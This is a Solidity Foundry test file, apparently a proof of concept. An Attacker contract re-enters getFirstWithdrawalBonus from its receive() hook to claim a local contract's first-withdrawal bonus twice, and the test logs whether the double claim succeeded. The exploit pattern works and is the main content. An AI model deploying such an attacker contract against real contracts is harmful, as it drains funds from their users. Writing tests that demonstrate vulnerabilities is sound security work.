// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_bonus.sol";

contract ReentrancyBonusTest is Test {
    Reentrancy_bonus public target;
    Attacker public attacker;

    function setUp() public {
        target = new Reentrancy_bonus();
        vm.deal(address(target), 1 ether); // Fund contract with 1 ETH for withdrawals
        attacker = new Attacker(address(target));
    }

    function testReentrancyExploit() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 initClaims = target.totalBonusClaims();
        uint256 initDistributed = target.totalRewardsDistributed();
        uint256 initAttackerRewards = target.userTotalRewards(address(attacker));
        
        console.log("Initial bonus claims:     ", initClaims);
        console.log("Initial rewards distributed:", initDistributed);
        console.log("Initial attacker rewards:  ", initAttackerRewards);

        console.log("--- Trigger Attack ---");
        uint256 initialBalance = address(attacker).balance;
        attacker.attack(); // Trigger the reentrancy attack
        
        console.log("--- AFTER-Trigger State ---");
        uint256 finalBalance = address(attacker).balance;
        uint256 finalClaims = target.totalBonusClaims();
        uint256 finalDistributed = target.totalRewardsDistributed();
        uint256 finalAttackerRewards = target.userTotalRewards(address(attacker));
        
        console.log("Attacker ETH balance change:", finalBalance - initialBalance);
        console.log("Final bonus claims:         ", finalClaims);
        console.log("Final rewards distributed:   ", finalDistributed);
        console.log("Final attacker rewards:     ", finalAttackerRewards);
        
        console.log("--- State Change Analysis ---");
        bool claimsIncreased = finalClaims - initClaims == 2;
        bool rewardsIncreased = finalDistributed - initDistributed == 200;
        bool attackerRewardsIncreased = finalAttackerRewards - initAttackerRewards == 200;
        
        console.log("Claims increase valid:      ", claimsIncreased ? "YES" : "NO");
        console.log("Total rewards valid:        ", rewardsIncreased ? "YES" : "NO");
        console.log("Attacker rewards valid:     ", attackerRewardsIncreased ? "YES" : "NO");
        
        // Final vulnerability verdict
        if (claimsIncreased && rewardsIncreased && attackerRewardsIncreased) {
            console.log("Vulnerability Exists: Reentrancy attack doubled reward claims");
        } else {
            console.log("Vulnerability not Exist: State changes do not match exploit pattern");
        }
    }
}

contract Attacker {
    // Attacker contract remains unchanged
    Reentrancy_bonus public target;
    uint256 private reentryCount;

    constructor(address _target) {
        target = Reentrancy_bonus(_target);
    }

    function attack() external {
        target.getFirstWithdrawalBonus(address(this));
    }

    receive() external payable {
        if (reentryCount < 1) {
            reentryCount++;
            target.getFirstWithdrawalBonus(address(this)); // Reenter during withdrawal
        }
    }
}